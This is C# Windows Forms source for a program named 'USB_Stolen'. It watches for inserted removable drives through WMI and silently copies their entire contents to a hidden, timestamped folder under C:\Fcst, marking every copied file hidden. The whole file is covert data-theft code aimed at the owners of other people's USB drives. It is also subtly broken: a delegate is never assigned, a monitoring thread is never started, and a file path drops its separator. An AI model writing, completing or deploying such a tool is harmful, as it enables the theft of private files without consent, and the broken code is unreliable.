using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Threading;
using System.Management;

namespace USB_Stolen
{
    public partial class Form1 : Form
    {
        const int RemoveableDisk = 2;
        const int RamDisk = 6;
        bool Start = true;
        Thread DiskAdd = null;
        ManagementObjectSearcher Mquery = new
           ManagementObjectSearcher("SELECT * From Win32_LogicalDisk");
        private delegate void OnFileCopyDelegate(
            bool flags, string FileTo, string FileFrom);
        private OnFileCopyDelegate onCopy = null;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
        private void DiskUpdate()
        {
            var bqueryCollection = Mquery.Get();
            while (Start)
            {
                var query = new
                     ManagementObjectSearcher("SELECT * From Win32_LogicalDisk");
                var aqueryCollection = query.Get();
                if (aqueryCollection.Count != bqueryCollection.Count)
                {
                    Start = false;
                    Mquery = query;
                    bqueryCollection = aqueryCollection;
                    DiskSelect();
                }
            }
        }
        private void DiskSelect()
        {
            var queryCollection = Mquery.Get();
            foreach (var drive in queryCollection)
            {
                switch (Convert.ToInt32(drive["DriveType"].ToString()))
                {
                    case RemoveableDisk:
                        OnDriveArrived(drive["Name"].ToString());
                        break;
                }
            }
            Start = true;
        }
        private void OnDriveArrived(string diskpath)
        {
            var ThreadUSBCopy = new
                Thread(new ParameterizedThreadStart(copysubFolder));
            ThreadUSBCopy.Start(diskpath + @"\\" + "?" + @"C:\\Fcst" + @"\\" + @"\\" + DateTime.Now.ToString().Replace(':','.'));
        }
        private void copysubFolder(object copyInfo)
        {
            try
            {
                var copyString = Convert.ToString(copyInfo).Split('?');
                var copyFrom = copyString[0];
                var copyTo = copyString[1];
                var fromDir = new DirectoryInfo(copyFrom);
                var toDir = new DirectoryInfo(copyTo);
                DirectoryInfo[] fromDirs = null;
                Invoke(onCopy, true, "", copyTo);
                fromDirs = fromDir.GetDirectories();
                var fromFile = fromDir.GetFiles();
                for (int i = 0; i < fromFile.Length; i++)
                {
                    Invoke(onCopy, false, toDir.ToString() + @"\\" +
                        fromFile[i].Name, fromDir.FullName + fromFile[i].Name);
                }
                for (int i = 0; i < fromDirs.Length; i++)
                {
                    copysubFolder(fromDirs[i].FullName + "?" +
                        copyTo + @"\\" + fromDirs[i].Name);
                }
            }
            catch (Exception) { return; }
        }
        private void FileCopyDel(bool flags, string FileTo, string FileFrom)
        {
            if (flags == true)
            {
                var toDir = new DirectoryInfo(FileFrom);
                toDir.Create();
                toDir.Attributes = FileAttributes.Hidden;
            }
            else
            {
                FileInfo fi = new FileInfo(FileFrom);
                fi.CopyTo(FileTo);
                File.SetAttributes(FileTo, FileAttributes.Hidden);
            }
        }

        private void btnHide_Click(object sender, EventArgs e)
        {

        }
    }
}
